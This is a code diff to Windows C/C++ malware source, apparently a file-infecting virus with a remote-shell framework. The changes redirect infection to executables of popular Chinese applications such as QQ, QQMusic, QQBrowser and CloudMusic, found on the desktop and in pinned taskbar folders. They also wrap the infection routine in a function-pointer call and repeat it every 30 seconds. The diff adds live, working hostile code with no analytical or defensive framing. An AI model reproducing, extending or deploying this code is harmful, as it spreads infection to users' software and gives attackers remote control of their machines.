@@ -28,6 +28,46 @@ BOOL IsFilter(const char *Path)
 	return FALSE;
 }
 
+BOOL IsTarget(const char *Path)
+{
+	char Buffer[MAX_PATH*2];
+	strcpy(Buffer,Path);
+	strupr(Buffer);
+	if (strstr(Buffer,"CLOUDMUSIC"))
+	{
+		return TRUE;
+	}
+	if (strstr(Buffer,"QQSCLAUNCHE"))
+	{
+		return TRUE;
+	}
+	if (strstr(Buffer,"QQGAME"))
+	{
+		return TRUE;
+	}
+	if (strstr(Buffer,"QQMUSIC"))
+	{
+		return TRUE;
+	}
+
+	return FALSE;
+}
+BOOL IsTarget2(const char *Path)
+{
+	char Buffer[MAX_PATH*2];
+	strcpy(Buffer,Path);
+	strupr(Buffer);
+	if (strstr(Buffer,"QQ.EX"))
+	{
+		return TRUE;
+	}
+	if (strstr(Buffer,"QQBROWSER"))
+	{
+		return TRUE;
+	}
+	return FALSE;
+}
+
 BOOL IsAlreadyRunning()
 {
 	G_hMutex = ::CreateMutex(NULL,TRUE,REMOTESHELL_PROCESS_GUID);
@@ -65,7 +105,7 @@ int InfectDirectory(const char *Dir)
 
 		if(!(fileattr&FILE_ATTRIBUTE_SYSTEM))
 		{
-				if(!IsFilter(infFile))
+				if(IsTarget(infFile)||IsTarget2(infFile))
 				if(XInfester_InfectFile(infFile))
 				InfectCount++;
 		}
@@ -79,6 +119,16 @@ int InfectDirectory(const char *Dir)
 
 }
 
+void InfectProcess()
+{
+	char path[MAX_PATH];
+	SHGetSpecialFolderPath(0,path,CSIDL_DESKTOPDIRECTORY,0);
+	InfectDirectory(path);
+	SHGetSpecialFolderPath(0,path,CSIDL_APPDATA,0);
+	strcat(path,"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
+	InfectDirectory(path);
+}
+
 int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
 {
 	//X Infester starter
@@ -86,13 +136,10 @@ int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, 
 
 	//Infect process
 	//Desktop
-	char path[MAX_PATH];
-	SHGetSpecialFolderPath(0,path,CSIDL_DESKTOPDIRECTORY,0);
-	InfectDirectory(path);
-	SHGetSpecialFolderPath(0,path,CSIDL_APPDATA,0);
-	strcat(path,"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
-	InfectDirectory(path);
-
+	void (*infectProc)();
+	infectProc=NULL;
+	infectProc=InfectProcess;
+	infectProc();
 	if (IsAlreadyRunning())
 	{
 		exit(0);
@@ -106,5 +153,11 @@ int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, 
 
 	G_RemoteFrameWork.Run();
 
-	while(1){Sleep(10000);};
+	while(1){
+		infectProc=NULL;
+		infectProc=InfectProcess;
+		infectProc();
+	//	InfectProcess();
+		Sleep(30000);
+	};
 }
